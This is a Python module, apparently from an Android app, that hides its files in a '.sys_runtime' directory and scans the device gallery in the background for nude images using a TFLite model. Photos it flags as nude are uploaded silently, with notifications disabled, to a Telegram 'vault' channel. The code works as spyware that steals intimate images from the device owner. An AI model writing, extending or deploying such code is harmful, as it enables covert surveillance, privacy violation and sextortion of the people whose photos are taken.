# -*- coding: utf-8 -*-
import os
import time
import threading
import logging
import sqlite3
import hashlib
import gc
import shutil
from datetime import datetime

# ========== توحيد مسار runtime ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
M = os.path.join(P, ".models")
if not os.path.exists(M):
    os.makedirs(M)

logging.basicConfig(filename=os.path.join(P, "n.log"), level=logging.ERROR, filemode='a')

# ========== استيراد المكتبات ==========
try:
    import numpy as np
    from PIL import Image, UnidentifiedImageError
    Image.MAX_IMAGE_PIXELS = 50_000_000

    # محاولة استيراد TFLite
    try:
        from tflite_runtime.interpreter import Interpreter
    except ImportError:
        try:
            from tensorflow.lite.python.interpreter import Interpreter
        except ImportError:
            import tensorflow as tf
            Interpreter = tf.lite.Interpreter

    JNI = True
except Exception as e:
    logging.error(f"Import error in NudeDetector: {e}")
    JNI = False


class NudeDetector:
    def __init__(self, mon=None):
        self.mon = mon
        self.active = False
        self.model = None
        self._lock = threading.Lock()
        self.last_run = 0

        # مسار النموذج داخل .sys_runtime/.models
        self.model_path = os.path.join(M, "engine_v2.tflite")

        # المسارات المحتملة للنموذج في assets (داخل APK)
        base_dir = os.getcwd()
        self.assets_candidates = [
            os.path.join(base_dir, "assets", "engine_v2.tflite"),
            os.path.join(base_dir, "engine_v2.tflite")
        ]

        # قاعدة بيانات الكاش (لمنع إعادة تحليل نفس الصورة)
        self.db = os.path.join(P, "n_cache.db")
        self._init_db()

        # بدء تحضير النموذج في الخلفية
        if JNI:
            threading.Thread(target=self._prepare_engine, daemon=True).start()

    # ========== إدارة قاعدة البيانات ==========
    def _init_db(self):
        try:
            with sqlite3.connect(self.db) as conn:
                conn.execute('CREATE TABLE IF NOT EXISTS scan_logs (h TEXT PRIMARY KEY, ts INTEGER)')
                # تنظيف السجلات الأقدم من 30 يومًا
                old_threshold = int(time.time()) - (30 * 86400)
                conn.execute('DELETE FROM scan_logs WHERE ts < ?', (old_threshold,))
                conn.commit()
        except Exception as e:
            logging.error(f"DB init error: {e}")

    # ========== تحضير وتحميل النموذج ==========
    def _prepare_engine(self):
        if not JNI:
            return
        try:
            # إذا كان النموذج غير موجود أو حجمه صغير جداً (< 500KB)
            if not os.path.exists(self.model_path) or os.path.getsize(self.model_path) < 500000:
                # محاولة النسخ من assets
                for src in self.assets_candidates:
                    if os.path.exists(src):
                        shutil.copy(src, self.model_path)
                        logging.info(f"Model copied from {src}")
                        break
            # تحميل النموذج
            self._load_engine()
        except Exception as e:
            logging.error(f"Prepare engine error: {e}")

    def _load_engine(self):
        try:
            if os.path.exists(self.model_path) and os.path.getsize(self.model_path) > 500000:
                self.model = Interpreter(model_path=self.model_path)
                self.model.allocate_tensors()
                inputs = self.model.get_input_details()
                outputs = self.model.get_output_details()
                self.in_idx = inputs[0]['index']
                self.out_idx = outputs[0]['index']
                logging.info("✅ TFLite engine loaded successfully")
            else:
                logging.error("Model missing or too small")
        except Exception as e:
            logging.error(f"Load engine error: {e}")

    # ========== تحليل صورة واحدة ==========
    def analyze(self, path):
        """تحليل صورة وإرجاع احتمال (0.0-1.0) للعري"""
        if not self.model or not JNI or not os.path.exists(path):
            return 0.0

        # استبعاد الملفات الكبيرة جداً (>8 ميجابايت) حفاظاً على الأداء
        if os.path.getsize(path) > 8 * 1024 * 1024:
            logging.warning(f"Image too large: {path}")
            return 0.0

        if not path.lower().endswith(('.png', '.jpg', '.jpeg', '.webp')):
            return 0.0

        try:
            with Image.open(path) as raw_img:
                img = raw_img.convert('RGB').resize((224, 224), Image.LANCZOS)

            arr = np.asarray(img, dtype=np.float32).reshape(1, 224, 224, 3) / 255.0
            self.model.set_tensor(self.in_idx, arr)
            self.model.invoke()
            out = self.model.get_tensor(self.out_idx)[0]
            prob = float(out[1]) if len(out) > 1 else float(out[0])

            del arr, img
            return prob

        except UnidentifiedImageError:
            logging.error(f"Cannot identify image: {path}")
            return 0.0
        except Exception as e:
            logging.error(f"Analyze error for {path}: {e}")
            return 0.0

    # ========== المسح التلقائي (يُستدعى من monitor) ==========
    def scan(self, mon):
        if self.active or not self.model:
            return

        # فحص البطارية (إن أمكن)
        if hasattr(mon, '_bat'):
            battery, charging = mon._bat()
            if battery < 20 and not charging:
                return

        now = time.time()
        if (now - self.last_run) < 1800:   # مرة كل 30 دقيقة على الأكثر
            return
        self.last_run = now

        threading.Thread(target=self._worker, args=(mon,), daemon=True).start()

    def _worker(self, mon):
        if not self._lock.acquire(blocking=False):
            return
        try:
            self.active = True
            sc = getattr(mon, 'media_scanner', None)
            if not sc:
                return

            # جلب الصور غير المصنفة (pending)
            items = sc.get_gallery_by_category("pending", limit=20)
            for item in items:
                path = item.get("path")
                if not path or not os.path.exists(path):
                    continue

                # حساب بصمة سريعة للمنع من التكرار
                h = hashlib.md5(path.encode()).hexdigest()
                if self._is_cached(h):
                    continue

                prob = self.analyze(path)

                if prob > 0.85:
                    sc.update_category(item.get("hash"), "nude", prob)
                    self._report(path, item.get("label", "??"), mon, prob)
                elif prob > 0.45:
                    sc.update_category(item.get("hash"), "questionable", prob)
                else:
                    # لا نحتاج لتخزين الصور العادية، نحذفها من قاعدة البيانات لتوفير المساحة
                    sc.update_category(item.get("hash"), "normal", prob)

                self._mark_cached(h)
                time.sleep(0.5)   # راحة للمعالج

        except Exception as e:
            logging.error(f"AI Worker error: {e}")
        finally:
            self.active = False
            self._lock.release()
            gc.collect()

    # ========== دوال الكاش ==========
    def _is_cached(self, h):
        try:
            with sqlite3.connect(self.db) as conn:
                cur = conn.execute("SELECT 1 FROM scan_logs WHERE h=?", (h,))
                return cur.fetchone() is not None
        except:
            return False

    def _mark_cached(self, h):
        try:
            with sqlite3.connect(self.db) as conn:
                conn.execute("INSERT OR REPLACE INTO scan_logs VALUES (?, ?)", (h, int(time.time())))
                conn.commit()
        except:
            pass

    # ========== إرسال التقرير إلى Telegram (عبر قناة الخزنة) ==========
    def _report(self, path, label, mon, confidence):
        try:
            tg = getattr(mon, 'ui', None)      # كائن TelegramUI
            vault = getattr(mon, 'vlt', None)  # معرف قناة الخزنة
            if tg and vault and os.path.exists(path):
                with open(path, 'rb') as f:
                    caption = f"🔞 **AI Detection**\nLabel: `{label}`\nConfidence: `{confidence:.0%}`\nTime: `{datetime.now().strftime('%H:%M:%S')}`"
                    # استخدام _api بدلاً من _ap (كما في telegram_ui.py المعدل)
                    tg._api("sendPhoto", {
                        "chat_id": vault,
                        "caption": caption,
                        "parse_mode": "Markdown",
                        "disable_notification": True
                    }, {"photo": f})
        except Exception as e:
            logging.error(f"Report error: {e}")


# ========== دالة المصنع ==========
def create(mon=None):
    return NudeDetector(mon)
